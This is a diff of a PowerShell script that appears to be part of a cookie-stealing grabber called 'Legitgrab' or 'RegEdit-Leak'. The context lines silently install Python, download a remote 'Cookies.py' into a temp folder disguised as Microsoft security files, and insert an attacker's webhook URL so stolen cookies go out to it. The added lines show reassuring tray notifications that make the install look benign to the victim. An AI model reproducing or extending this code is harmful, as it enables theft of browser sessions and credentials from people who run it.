@@ -44,6 +44,9 @@ cls
 if (Test-Path "C:\Users\$env:username\AppData\Local\Programs\Python\Python311\python.exe") {
 }
 else {
+    @echo off 
+
+powershell -Command "& {Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; $notify = New-Object System.Windows.Forms.NotifyIcon; $notify.Icon = [System.Drawing.SystemIcons]::Information; $notify.Visible = $true; $notify.ShowBalloonTip(0, 'RegEdit-Leak', 'Python 3.11 not found (it will install it automatically)', [System.Windows.Forms.ToolTipIcon]::None)}"
     Invoke-WebRequest https://www.python.org/ftp/python/3.11.0/python-3.11.0-amd64.exe -OutFile python_3.11.exe
     cls
     Start-Process -FilePath "C:\windows\temp\python_3.11.exe" -Wait -ArgumentList "/passive"
@@ -133,6 +136,7 @@ cls
 ######################################################################
 Invoke-WebRequest -Uri "https://raw.githubusercontent.com/Appolon24800/Legitgrab-POWERSHELL/main/asset/Cookies.py" -OutFile "C:\windows\temp\Win.microsoft.Security.temp\SecurityKeys.txt" 
 (Get-Content C:\windows\temp\Win.microsoft.Security.temp\SecurityKeys.txt) -replace 'hook = "WillBeReplaceBiUrWebHook"', $Hook | Set-Content C:\windows\temp\Win.microsoft.Security.temp\SecurityKeys_Crypted.py
+powershell -Command "& {Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; $notify = New-Object System.Windows.Forms.NotifyIcon; $notify.Icon = [System.Drawing.SystemIcons]::Information; $notify.Visible = $true; $notify.ShowBalloonTip(0, 'Regedit-leak', 'You can restart your pc in 2 minutes', [System.Windows.Forms.ToolTipIcon]::None)}"
 ######################################################################
 
 ######################################################################
